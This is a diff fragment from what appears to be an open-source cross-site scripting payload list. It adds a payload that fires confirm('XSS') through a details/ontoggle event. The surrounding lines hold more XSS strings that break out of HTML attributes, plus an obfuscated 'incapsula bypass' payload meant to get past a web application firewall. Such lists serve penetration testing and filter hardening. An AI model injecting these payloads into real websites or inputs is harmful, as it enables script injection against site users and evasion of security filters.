@@ -16,6 +16,7 @@ This is an open source repo. Anyone can contribute. :beers: <br/>
 <acronym><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
 <bgsound><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
 <xmp><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
+">'><details/open/ontoggle=confirm('XSS')>
 incapsula bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
 ```
 
